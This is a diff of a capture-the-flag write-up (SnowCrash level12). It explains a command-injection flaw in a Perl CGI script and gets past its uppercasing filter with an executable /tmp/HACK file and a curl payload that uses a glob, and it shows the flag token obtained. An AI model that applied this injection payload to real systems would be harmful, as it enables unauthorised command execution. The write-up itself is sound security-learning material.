@@ -1,5 +1,6 @@
 # Exploit a substitution command in Perl
 
+```
 #!/usr/bin/env perl
 # This script starts a CGI (Common Gateway Interface) program to handle web requests on localhost:4646
 
@@ -53,12 +54,13 @@ sub n {
 n(t(param("x"), param("y")));
 
 
+```
 
 The security vulnerability in this Perl script lies in its use of unvalidated user input within a system command, specifically within the egrep command execution. This vulnerability is a classic example of command injection.
 
 
 This line
-@output = `egrep "^$xx" /tmp/xd 2>&1`;
+```@output = `egrep "^$xx" /tmp/xd 2>&1`;```
 
 User Input Not Sanitized: The variable $xx is modified to uppercase and truncated at the first space, but these transformations do not sanitize it against malicious payloads that include shell metacharacters. An attacker could craft input that closes the egrep command and starts a new command, which the server would then execute.
 
@@ -69,15 +71,18 @@ Lets exploit this
 we can't exploit by simply call `getflag > /tmp/hack`,
 
 because we have
+```
 
  # Transform all lowercase letters in $xx to uppercase
   $xx =~ tr/a-z/A-Z/;
   
   # Remove all characters starting from the first whitespace character in $xx
   $xx =~ s/\s.*//;
+```
 
 so we create an UPPER CASE file to use shell substitution*
 
+```
 touch /tmp/HACK
 
 chmod +x /tmp/HACK
@@ -85,12 +90,13 @@ chmod +x /tmp/HACK
 level12@SnowCrash:~$ cat /tmp/HACK
 #!/bin/sh
 getflag | wall
+```
 
-
+```
 ..level12@SnowCrash:~$ curl localhost:4646?x='`/*/HACK`'
                                                                                
 Broadcast Message from flag12@Snow                                             
         (somewhere) at 23:56 ...                                               
                                                                                
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr                      
-                                                           
+```
